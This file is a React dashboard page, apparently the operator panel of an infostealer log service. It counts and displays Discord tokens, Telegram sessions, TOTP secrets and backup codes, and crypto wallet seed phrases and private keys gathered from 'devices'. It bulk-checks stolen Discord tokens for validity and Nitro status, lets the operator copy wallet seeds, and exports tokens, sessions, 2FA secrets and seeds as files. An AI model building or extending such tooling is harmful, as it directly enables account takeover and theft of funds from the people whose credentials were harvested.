"use client"

import { useState, useEffect } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { SidebarTrigger } from "@/components/ui/sidebar"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table"
import {
  MessageCircle,
  Send,
  Shield,
  Wallet,
  TrendingUp,
  Download,
  Copy,
  Eye,
  EyeOff,
  CheckCircle,
  XCircle,
  AlertCircle,
  Coins,
} from "lucide-react"
import { AuthGuard } from "@/components/auth-guard"
import { toast } from "sonner"

interface GlobalStats {
  total_items: number
  total_devices: number
  devices_with_messaging_wallet_data: number
  counts: {
    discord_tokens: number
    telegram_sessions: number
    authenticator_data: number
    crypto_wallets: number
    high_value_wallets: number
  }
  breakdown: {
    discord_by_type: Record<string, number>
    telegram_by_type: Record<string, number>
    wallets_by_type: Record<string, number>
    wallets_by_blockchain: Record<string, number>
  }
}

interface DiscordValidationStats {
  total_tokens: number
  validated_tokens: number
  valid_tokens: number
  invalid_tokens: number
  unvalidated_tokens: number
  nitro_tokens: number
  tokens_with_servers: number
  validation_rate: number
  valid_rate: number
}

interface DiscordToken {
  token: string
  token_type: string
  user_id?: string
  email?: string
  phone?: string
  source_application?: string
}

interface TelegramSession {
  tdata_path: string
  session_type: string
  has_key_data: boolean
  has_user_data: boolean
  phone_number?: string
  username?: string
  file_count: number
  total_size: number
}

interface AuthData {
  app_type: string
  service_name?: string
  account_name?: string
  secret_key?: string
  backup_codes?: string[]
}

interface CryptoWallet {
  wallet_type: string
  wallet_name: string
  blockchain?: string
  address?: string
  private_key?: string
  seed_phrase?: string
}

export default function MessagingWalletsPage() {
  return (
    <AuthGuard>
      <MessagingWalletsContent />
    </AuthGuard>
  )
}

function MessagingWalletsContent() {
  const [globalStats, setGlobalStats] = useState<GlobalStats | null>(null)
  const [highValueWallets, setHighValueWallets] = useState<CryptoWallet[]>([])
  const [validationStats, setValidationStats] = useState<DiscordValidationStats | null>(null)
  const [isLoading, setIsLoading] = useState(true)
  const [showSecrets, setShowSecrets] = useState<Record<string, boolean>>({})
  const [isValidating, setIsValidating] = useState(false)
  const [validationProgress, setValidationProgress] = useState<{
    current: number
    total: number
  } | null>(null)

  useEffect(() => {
    fetchGlobalStats()
    fetchHighValueWallets()
    fetchValidationStats()
  }, [])

  const fetchGlobalStats = async () => {
    try {
      const response = await fetch("/api/v1/messaging/stats/global")
      if (response.ok) {
        const data = await response.json()
        setGlobalStats(data)
      }
    } catch (error) {
      console.error("Error fetching global stats:", error)
      toast.error("Failed to load statistics")
    } finally {
      setIsLoading(false)
    }
  }

  const fetchHighValueWallets = async () => {
    try {
      const response = await fetch("/api/v1/wallets/high-value")
      if (response.ok) {
        const data = await response.json()
        setHighValueWallets(data.wallets || [])
      }
    } catch (error) {
      console.error("Error fetching high-value wallets:", error)
    }
  }

  const fetchValidationStats = async () => {
    try {
      const response = await fetch("/api/v1/messaging/discord/validation-stats")
      if (response.ok) {
        const data = await response.json()
        if (data.success && data.stats) {
          setValidationStats({
            ...data.stats,
            validation_rate: data.percentages.validation_rate,
            valid_rate: data.percentages.valid_rate,
          })
        }
      }
    } catch (error) {
      console.error("Error fetching validation stats:", error)
    }
  }

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text)
    toast.success(`${label} copied to clipboard`)
  }

  const toggleSecret = (id: string) => {
    setShowSecrets((prev) => ({ ...prev, [id]: !prev[id] }))
  }

  const maskSecret = (secret: string) => {
    return "*".repeat(secret.length)
  }

  const downloadExport = async (endpoint: string, filename: string) => {
    try {
      toast.info(`Preparing ${filename} export...`)

      const response = await fetch(endpoint)

      if (!response.ok) {
        const error = await response.json()
        toast.error(error.error || "Export failed")
        return
      }

      // Create blob and download
      const blob = await response.blob()
      const url = window.URL.createObjectURL(blob)
      const a = document.createElement("a")
      a.href = url
      a.download = filename
      document.body.appendChild(a)
      a.click()
      window.URL.revokeObjectURL(url)
      document.body.removeChild(a)

      toast.success(`${filename} downloaded successfully!`)
    } catch (error) {
      console.error("Export error:", error)
      toast.error("Failed to export data")
    }
  }

  const validateAllTokens = async () => {
    setIsValidating(true)
    setValidationProgress({ current: 0, total: validationStats?.unvalidated_tokens || 0 })

    try {
      toast.info("Starting Discord token validation...")

      const response = await fetch("/api/v1/messaging/discord/validate-all?limit=50", {
        method: "POST",
      })

      const data = await response.json()

      if (data.success) {
        toast.success(
          `Validation complete: ${data.valid} valid, ${data.invalid} invalid out of ${data.validated} tokens`,
        )

        // Refresh stats
        await fetchValidationStats()
        await fetchGlobalStats()

        setValidationProgress(null)
      } else {
        toast.error(data.error || "Validation failed")
      }
    } catch (error) {
      console.error("Validation error:", error)
      toast.error("Failed to validate tokens")
    } finally {
      setIsValidating(false)
      setValidationProgress(null)
    }
  }

  if (isLoading || !globalStats) {
    return (
      <div className="flex items-center justify-center h-screen">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto"></div>
          <p className="mt-4 text-muted-foreground">Loading messaging & wallet data...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="flex flex-col h-screen">
      {/* Header */}
      <header className="border-b bg-background/95 backdrop-blur supports-[backdrop-filter]:bg-background/60 sticky top-0 z-10">
        <div className="container flex h-16 items-center px-4">
          <SidebarTrigger className="mr-4" />
          <div className="flex items-center gap-3">
            <MessageCircle className="h-6 w-6 text-primary" />
            <div>
              <h1 className="text-2xl font-bold">Messaging & Wallets</h1>
              <p className="text-sm text-muted-foreground">
                {globalStats.total_items.toLocaleString()} items across{" "}
                {globalStats.devices_with_messaging_wallet_data} devices
              </p>
            </div>
          </div>
        </div>
      </header>

      <ScrollArea className="flex-1">
        <div className="container py-6 space-y-6">
          {/* Statistics Cards */}
          <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
            <Card>
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium">Discord Tokens</CardTitle>
                <MessageCircle className="h-4 w-4 text-blue-500" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{globalStats.counts.discord_tokens}</div>
                <p className="text-xs text-muted-foreground mt-1">
                  {validationStats && validationStats.validated_tokens > 0
                    ? `${validationStats.valid_tokens} valid, ${validationStats.invalid_tokens} invalid`
                    : `${Object.entries(globalStats.breakdown.discord_by_type).length} types detected`}
                </p>
              </CardContent>
            </Card>

            <Card>
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium">Telegram Sessions</CardTitle>
                <Send className="h-4 w-4 text-sky-500" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{globalStats.counts.telegram_sessions}</div>
                <p className="text-xs text-muted-foreground mt-1">
                  {Object.entries(globalStats.breakdown.telegram_by_type).length} session types
                </p>
              </CardContent>
            </Card>

            <Card>
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium">2FA/Authenticator</CardTitle>
                <Shield className="h-4 w-4 text-green-500" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{globalStats.counts.authenticator_data}</div>
                <p className="text-xs text-muted-foreground mt-1">TOTP secrets & backup codes</p>
              </CardContent>
            </Card>

            <Card>
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium">Crypto Wallets</CardTitle>
                <Wallet className="h-4 w-4 text-yellow-500" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{globalStats.counts.crypto_wallets}</div>
                <p className="text-xs text-muted-foreground mt-1">
                  {globalStats.counts.high_value_wallets} with seeds/keys
                </p>
              </CardContent>
            </Card>
          </div>

          {/* Discord Validation Section */}
          {validationStats && validationStats.total_tokens > 0 && (
            <Card>
              <CardHeader>
                <div className="flex items-center justify-between">
                  <div>
                    <CardTitle>Discord Token Validation</CardTitle>
                    <CardDescription>
                      Validation status and quality metrics for Discord tokens
                    </CardDescription>
                  </div>
                  {validationStats.unvalidated_tokens > 0 && (
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={validateAllTokens}
                      disabled={isValidating}
                    >
                      {isValidating ? (
                        <>
                          <div className="animate-spin mr-2 h-4 w-4 border-2 border-primary border-t-transparent rounded-full" />
                          Validating...
                        </>
                      ) : (
                        <>
                          <CheckCircle className="h-4 w-4 mr-2" />
                          Validate {validationStats.unvalidated_tokens} Tokens
                        </>
                      )}
                    </Button>
                  )}
                </div>
              </CardHeader>
              <CardContent>
                <div className="grid gap-4 md:grid-cols-3 mb-6">
                  <div className="flex flex-col gap-2">
                    <div className="flex items-center justify-between">
                      <span className="text-sm font-medium">Validation Rate</span>
                      <Badge variant="outline">{validationStats.validation_rate}%</Badge>
                    </div>
                    <div className="h-2 bg-secondary rounded-full overflow-hidden">
                      <div
                        className="h-full bg-blue-500 transition-all"
                        style={{ width: `${validationStats.validation_rate}%` }}
                      />
                    </div>
                    <span className="text-xs text-muted-foreground">
                      {validationStats.validated_tokens} of {validationStats.total_tokens} validated
                    </span>
                  </div>

                  <div className="flex flex-col gap-2">
                    <div className="flex items-center justify-between">
                      <span className="text-sm font-medium">Valid Rate</span>
                      <Badge variant="outline" className="bg-green-500/10 text-green-600">
                        {validationStats.valid_rate}%
                      </Badge>
                    </div>
                    <div className="h-2 bg-secondary rounded-full overflow-hidden">
                      <div
                        className="h-full bg-green-500 transition-all"
                        style={{ width: `${validationStats.valid_rate}%` }}
                      />
                    </div>
                    <span className="text-xs text-muted-foreground">
                      {validationStats.valid_tokens} valid tokens
                    </span>
                  </div>

                  <div className="flex flex-col gap-2">
                    <div className="flex items-center justify-between">
                      <span className="text-sm font-medium">Premium Accounts</span>
                      <Badge variant="outline" className="bg-purple-500/10 text-purple-600">
                        {validationStats.nitro_tokens}
                      </Badge>
                    </div>
                    <span className="text-xs text-muted-foreground mt-2">
                      {validationStats.tokens_with_servers} with servers
                    </span>
                  </div>
                </div>

                <div className="grid gap-3 md:grid-cols-4">
                  <div className="flex items-center gap-3 p-3 border rounded-lg">
                    <CheckCircle className="h-5 w-5 text-green-500" />
                    <div>
                      <div className="text-2xl font-bold">{validationStats.valid_tokens}</div>
                      <div className="text-xs text-muted-foreground">Valid</div>
                    </div>
                  </div>

                  <div className="flex items-center gap-3 p-3 border rounded-lg">
                    <XCircle className="h-5 w-5 text-red-500" />
                    <div>
                      <div className="text-2xl font-bold">{validationStats.invalid_tokens}</div>
                      <div className="text-xs text-muted-foreground">Invalid</div>
                    </div>
                  </div>

                  <div className="flex items-center gap-3 p-3 border rounded-lg">
                    <AlertCircle className="h-5 w-5 text-yellow-500" />
                    <div>
                      <div className="text-2xl font-bold">{validationStats.unvalidated_tokens}</div>
                      <div className="text-xs text-muted-foreground">Unvalidated</div>
                    </div>
                  </div>

                  <div className="flex items-center gap-3 p-3 border rounded-lg">
                    <TrendingUp className="h-5 w-5 text-purple-500" />
                    <div>
                      <div className="text-2xl font-bold">{validationStats.nitro_tokens}</div>
                      <div className="text-xs text-muted-foreground">Nitro</div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Breakdown Charts */}
          <div className="grid gap-4 md:grid-cols-2">
            <Card>
              <CardHeader>
                <CardTitle>Wallet Distribution</CardTitle>
                <CardDescription>By wallet type</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {Object.entries(globalStats.breakdown.wallets_by_type).map(([type, count]) => (
                    <div key={type} className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <div className="w-2 h-2 rounded-full bg-yellow-500" />
                        <span className="text-sm capitalize">{type.replace(/_/g, " ")}</span>
                      </div>
                      <Badge variant="secondary">{count}</Badge>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle>Blockchain Distribution</CardTitle>
                <CardDescription>By cryptocurrency</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {Object.entries(globalStats.breakdown.wallets_by_blockchain).map(
                    ([blockchain, count]) => (
                      <div key={blockchain} className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <Coins className="h-4 w-4 text-yellow-500" />
                          <span className="text-sm">{blockchain}</span>
                        </div>
                        <Badge variant="secondary">{count}</Badge>
                      </div>
                    ),
                  )}
                </div>
              </CardContent>
            </Card>
          </div>

          {/* High-Value Wallets */}
          {highValueWallets.length > 0 && (
            <Card>
              <CardHeader>
                <div className="flex items-center justify-between">
                  <div>
                    <CardTitle>High-Value Wallets</CardTitle>
                    <CardDescription>
                      Wallets with seed phrases or private keys ({highValueWallets.length} total)
                    </CardDescription>
                  </div>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() =>
                      toast.success("Export functionality coming soon")
                    }
                  >
                    <Download className="h-4 w-4 mr-2" />
                    Export
                  </Button>
                </div>
              </CardHeader>
              <CardContent>
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>Wallet</TableHead>
                      <TableHead>Type</TableHead>
                      <TableHead>Blockchain</TableHead>
                      <TableHead>Has Seed</TableHead>
                      <TableHead>Has Key</TableHead>
                      <TableHead>Actions</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {highValueWallets.slice(0, 10).map((wallet, idx) => (
                      <TableRow key={idx}>
                        <TableCell className="font-medium">{wallet.wallet_name}</TableCell>
                        <TableCell>
                          <Badge variant="outline">{wallet.wallet_type}</Badge>
                        </TableCell>
                        <TableCell>{wallet.blockchain || "Unknown"}</TableCell>
                        <TableCell>
                          {wallet.seed_phrase ? (
                            <CheckCircle className="h-4 w-4 text-green-500" />
                          ) : (
                            <XCircle className="h-4 w-4 text-gray-300" />
                          )}
                        </TableCell>
                        <TableCell>
                          {wallet.private_key ? (
                            <CheckCircle className="h-4 w-4 text-green-500" />
                          ) : (
                            <XCircle className="h-4 w-4 text-gray-300" />
                          )}
                        </TableCell>
                        <TableCell>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => {
                              const data = wallet.seed_phrase || wallet.private_key || ""
                              copyToClipboard(data, "Wallet data")
                            }}
                          >
                            <Copy className="h-4 w-4" />
                          </Button>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
                {highValueWallets.length > 10 && (
                  <div className="mt-4 text-center">
                    <Button variant="outline" size="sm">
                      View All {highValueWallets.length} Wallets
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>
          )}

          {/* Discord & Telegram Breakdown */}
          <div className="grid gap-4 md:grid-cols-2">
            <Card>
              <CardHeader>
                <CardTitle>Discord Token Types</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {Object.entries(globalStats.breakdown.discord_by_type).map(([type, count]) => (
                    <div key={type} className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <MessageCircle className="h-4 w-4 text-blue-500" />
                        <span className="text-sm capitalize">{type.replace(/_/g, " ")}</span>
                      </div>
                      <Badge>{count}</Badge>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle>Telegram Session Types</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {Object.entries(globalStats.breakdown.telegram_by_type).map(([type, count]) => (
                    <div key={type} className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <Send className="h-4 w-4 text-sky-500" />
                        <span className="text-sm capitalize">{type}</span>
                      </div>
                      <Badge>{count}</Badge>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Quick Actions */}
          <Card>
            <CardHeader>
              <CardTitle>Quick Actions</CardTitle>
              <CardDescription>Validate tokens and export your data</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="flex flex-wrap gap-3">
                {validationStats && validationStats.unvalidated_tokens > 0 && (
                  <Button
                    variant="default"
                    onClick={validateAllTokens}
                    disabled={isValidating}
                  >
                    {isValidating ? (
                      <>
                        <div className="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full" />
                        Validating...
                      </>
                    ) : (
                      <>
                        <CheckCircle className="h-4 w-4 mr-2" />
                        Validate Discord Tokens
                      </>
                    )}
                  </Button>
                )}
                <Button
                  variant="outline"
                  onClick={() =>
                    downloadExport(
                      "/api/v1/messaging/discord/export",
                      `discord_tokens_${new Date().toISOString().slice(0, 10)}.txt`,
                    )
                  }
                >
                  <Download className="h-4 w-4 mr-2" />
                  Export All Discord Tokens
                </Button>
                <Button
                  variant="outline"
                  onClick={() =>
                    downloadExport(
                      "/api/v1/messaging/telegram/export",
                      `telegram_sessions_${new Date().toISOString().slice(0, 10)}.txt`,
                    )
                  }
                >
                  <Download className="h-4 w-4 mr-2" />
                  Export Telegram Sessions
                </Button>
                <Button
                  variant="outline"
                  onClick={() =>
                    downloadExport(
                      "/api/v1/messaging/2fa/export",
                      `2fa_secrets_${new Date().toISOString().slice(0, 10)}.txt`,
                    )
                  }
                >
                  <Download className="h-4 w-4 mr-2" />
                  Export 2FA Secrets
                </Button>
                <Button
                  variant="outline"
                  onClick={() =>
                    downloadExport(
                      "/api/v1/wallets/export/seeds",
                      `wallet_seeds_${new Date().toISOString().slice(0, 10)}.txt`,
                    )
                  }
                >
                  <Download className="h-4 w-4 mr-2" />
                  Export Wallet Seeds
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>
      </ScrollArea>
    </div>
  )
}
